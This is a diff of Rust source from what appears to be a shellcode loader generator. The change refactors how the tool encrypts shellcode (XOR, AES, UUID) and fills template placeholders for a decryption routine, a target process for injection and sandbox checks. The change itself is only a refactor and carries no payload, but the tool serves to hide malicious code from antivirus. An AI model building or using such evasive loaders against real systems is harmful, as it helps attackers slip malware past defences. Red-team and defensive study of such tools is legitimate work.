@@ -1,9 +1,7 @@
 use crate::aes::encrypt_aes;
 use crate::arg_parser::{Encryption, Execution, Format, Order};
 use crate::sandbox::build_sandbox;
-use crate::tools::{
-    absolute_path, quoted_path, random_aes_iv, random_aes_key, random_u8, EncryptionOutput,
-};
+use crate::tools::{random_aes_iv, random_aes_key, random_u8, EncryptionOutput};
 use crate::uuid_enc::encrypt_uuid;
 use crate::xor::encrypt_xor;
 use fs_extra::dir::{copy, CopyOptions};
@@ -80,57 +78,44 @@ fn template_path_for_execution(execution: &Execution) -> &'static Path {
     }
 }
 
-fn build_encrypted_output(
-    order: &Order,
-    src_dir: &Path,
-) -> (EncryptionOutput, String) {
-    match order.encryption {
-        Encryption::Xor => {
-            let path = src_dir.join("input.xor");
-            let abs = absolute_path(&path).expect("Invalid XOR output path");
-            let output = encrypt_xor(&order.shellcode_path, &path, random_u8());
-            (output, quoted_path(&abs))
-        }
-        Encryption::Aes => {
-            let path = src_dir.join("input.aes");
-            let abs = absolute_path(&path).expect("Invalid AES output path");
-            let output = encrypt_aes(&order.shellcode_path, &path, &random_aes_key(), &random_aes_iv());
-            (output, quoted_path(&abs))
-        }
-        Encryption::Uuid => {
-            let path = src_dir.join("input.uuid");
-            let abs = absolute_path(&path).expect("Invalid UUID output path");
-            let output = encrypt_uuid(&order.shellcode_path, &path);
-            (output, quoted_path(&abs))
-        }
+fn encrypted_filename(encryption: &Encryption) -> &'static str {
+    match encryption {
+        Encryption::Xor => "input.xor",
+        Encryption::Aes => "input.aes",
+        Encryption::Uuid => "input.uuid",
     }
 }
 
+fn build_encrypted_output(order: &Order, src_dir: &Path) -> (EncryptionOutput, String) {
+    let filename = encrypted_filename(&order.encryption);
+    let path = src_dir.join(filename);
+    let include_path = format!("\"{}\"", filename);
+
+    let output = match order.encryption {
+        Encryption::Xor => encrypt_xor(&order.shellcode_path, &path, random_u8()),
+        Encryption::Aes => {
+            encrypt_aes(&order.shellcode_path, &path, &random_aes_key(), &random_aes_iv())
+        }
+        Encryption::Uuid => encrypt_uuid(&order.shellcode_path, &path),
+    };
+
+    (output, include_path)
+}
+
 fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
-    let shellcode_abs = absolute_path(&order.shellcode_path).expect("Invalid shellcode path");
+    let (enc_output, include_path) = build_encrypted_output(order, src_dir);
 
     let mut replacements: HashMap<&'static str, String> = HashMap::new();
-    replacements.insert("{{DEPENDENCIES}}", String::new());
-    replacements.insert("{{IMPORTS}}", String::new());
-    replacements.insert("{{DECRYPTION_FUNCTION}}", String::new());
-    replacements.insert("{{MAIN}}", String::new());
-    replacements.insert("{{PATH_TO_SHELLCODE}}", quoted_path(&shellcode_abs));
+    replacements.insert("{{PATH_TO_SHELLCODE}}", include_path);
+    replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
+    replacements.insert("{{MAIN}}", enc_output.main);
+    replacements.insert("{{DEPENDENCIES}}", enc_output.dependencies.unwrap_or_default());
+    replacements.insert("{{IMPORTS}}", enc_output.imports.unwrap_or_default());
     replacements.insert("{{DLL_MAIN}}", String::new());
     replacements.insert("{{DLL_FORMAT}}", String::new());
     replacements.insert("{{TARGET_PROCESS}}", order.target_process.clone());
     replacements.insert("{{SANDBOX}}", String::new());
     replacements.insert("{{SANDBOX_IMPORTS}}", String::new());
-
-    let (enc_output, shellcode_path_str) = build_encrypted_output(order, src_dir);
-    replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
-    replacements.insert("{{MAIN}}", enc_output.main);
-    replacements.insert("{{PATH_TO_SHELLCODE}}", shellcode_path_str);
-    if let Some(deps) = enc_output.dependencies {
-        replacements.insert("{{DEPENDENCIES}}", deps);
-    }
-    if let Some(imports) = enc_output.imports {
-        replacements.insert("{{IMPORTS}}", imports);
-    }
 
     if let Some(ref domain) = order.sandbox {
         let sandbox_output = build_sandbox(domain);
